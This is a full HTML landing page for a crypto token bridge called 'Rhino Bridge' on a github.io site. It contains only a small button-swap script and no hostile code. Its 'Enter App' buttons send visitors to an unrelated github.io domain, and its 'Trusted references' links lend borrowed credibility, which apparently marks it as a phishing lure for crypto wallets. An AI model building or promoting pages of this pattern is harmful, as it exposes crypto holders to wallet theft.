<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Rhino Bridge</title>
  <meta name="description" content="Rhino Bridge moves tokens across chains and L2s from your own wallet.">
  <link rel="canonical" href="https://rhino-bridge-site.github.io/">
  <meta name="robots" content="index,follow,max-image-preview:large">
  <meta name="theme-color" content="#F7F7F5">
  <meta property="og:type" content="website">
  <meta property="og:title" content="Rhino Bridge">
  <meta property="og:description" content="Rhino Bridge moves tokens across chains and L2s from your own wallet.">
  <meta property="og:url" content="https://rhino-bridge-site.github.io/">
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Rhino Bridge">
  <meta name="twitter:description" content="Rhino Bridge moves tokens across chains and L2s from your own wallet.">
  <link rel="icon" type="image/png" href="favicon.png">
  <link rel="apple-touch-icon" href="favicon.png">
  <link rel="manifest" href="site.webmanifest">
  <link rel="stylesheet" href="style.css">
  <script type="application/ld+json">
  {
    "@context": "https://schema.org",
    "@graph": [
      {
        "@type": "WebSite",
        "@id": "https://rhino-bridge-site.github.io/#website",
        "url": "https://rhino-bridge-site.github.io/",
        "name": "Rhino Bridge",
        "inLanguage": "en"
      },
      {
        "@type": "Organization",
        "@id": "https://rhino-bridge-site.github.io/#organization",
        "name": "Rhino Bridge",
        "url": "https://rhino-bridge-site.github.io/"
      },
      {
        "@type": "WebApplication",
        "@id": "https://rhino-bridge-site.github.io/#app",
        "name": "Rhino Bridge",
        "applicationCategory": "FinanceApplication",
        "operatingSystem": "Web",
        "url": "https://rhino-bridge-site.github.io/",
        "offers": {
          "@type": "Offer",
          "price": "0",
          "priceCurrency": "USD"
        }
      }
    ]
  }
  </script>
</head>
<body>
  <header class="topbar">
    <a class="brand" href="#" aria-label="Rhino Bridge home">
      <img src="favicon.png" width="30" height="30" alt="">
      <span>Rhino Bridge</span>
    </a>

    <nav class="nav" aria-label="Trusted references">
      <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
      <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
      <a href="https://l2beat.com/scaling/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
    </nav>

    <span class="spacer" aria-hidden="true"></span>
    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
  </header>

  <main class="stage">
    <section class="hero" aria-labelledby="page-title">
      <h1 id="page-title">Rhino Bridge</h1>
      <p class="sub"><strong>Rhino Bridge</strong> moves tokens across chains and L2s from your own wallet.</p>
    </section>

    <section class="app-card" aria-label="Cross-chain bridge route">
      <div class="route">
        <div class="leg">
          <span class="label">From</span>
          <span class="chip">
            <img class="token" src="eth.png" width="28" height="28" alt="ETH">
            <span class="asset">ETH</span>
          </span>
        </div>

        <button class="switch" type="button" data-switch aria-label="Switch direction">
          <span aria-hidden="true">→</span>
        </button>

        <div class="leg">
          <span class="label">To</span>
          <span class="chip">
            <img class="token" src="usdc.png" width="28" height="28" alt="USDC">
            <span class="asset">USDC</span>
          </span>
        </div>
      </div>

      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
    </section>
  </main>

  <footer class="footer">Rhino Bridge &mdash; 2026</footer>

  <script>
  (function () {
    "use strict";

    var button = document.querySelector("[data-switch]");
    if (!button) return;

    button.addEventListener("click", function () {
      var chips = document.querySelectorAll(".chip");
      if (chips.length < 2) return;

      var from = chips[0].innerHTML;
      chips[0].innerHTML = chips[1].innerHTML;
      chips[1].innerHTML = from;
      button.classList.toggle("is-swapped");
    });
  })();
  </script>
</body>
</html>
